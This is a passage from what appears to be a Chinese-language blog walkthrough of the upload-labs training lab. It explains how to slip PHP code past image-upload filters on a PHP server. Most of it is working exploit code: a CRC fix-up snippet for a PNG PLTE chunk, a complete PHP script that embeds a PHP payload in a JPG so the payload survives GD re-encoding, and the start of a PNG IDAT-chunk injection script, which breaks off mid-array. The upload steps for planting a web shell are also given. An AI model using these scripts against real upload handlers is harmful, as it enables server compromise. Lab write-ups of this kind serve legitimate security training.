&#x27;&#x27;&#x27;</span></span><br><span class="line">data =  <span class="string">&#x27;504c5445&#x27;</span>+ re.findall(<span class="string">&#x27;504c5445(.*?)49444154&#x27;</span>,hexstr)[<span class="number">0</span>]</span><br><span class="line">crc = binascii.crc32(data[:-<span class="number">16</span>].decode(<span class="string">&#x27;hex&#x27;</span>)) &amp; <span class="number">0xffffffff</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(crc))</span><br></pre></td></tr></table></figure><p>得到 0xd4a5055dL ，填入CRC位置</p><p><img src="/2022/02/28/upload-labs/2022-03-03-08-40-58.png"></p><p>然后上传，包含即可，部分图片shell会被吞掉一部分，原因待补，亦或是编码错误，可以多试试几个图片。</p><p><img src="/2022/02/28/upload-labs/2022-03-03-12-45-20.png"></p><p>3、jpg  </p><p>这里原理待补  </p><p>大佬的脚本，被另一位大佬微修了一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line"></span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line"></span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line"></span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line"></span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line"></span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line"></span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line"></span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line"></span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line"></span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line"></span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line"></span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line"></span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line"></span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line"></span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable language_">$this</span>-&gt;binData);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable language_">$this</span>-&gt;binData));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable language_">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable language_">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable language_">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable language_">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable language_">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable language_">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable language_">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>找到一张图片，上传，然后下载，再用此脚本加工，再上传即可（部分图片shell写入失败，多试几张）<br><code>php shell.php processed.jpg</code><br>会得到一个payload_processed.jpg<br>再上传即可<br><img src="/2022/02/28/upload-labs/2022-03-02-20-02-37.png">  </p><p>法3：<br>写入IDAT数据块，使imagecreatefrom*处理图片前后一样，下面为大佬脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span 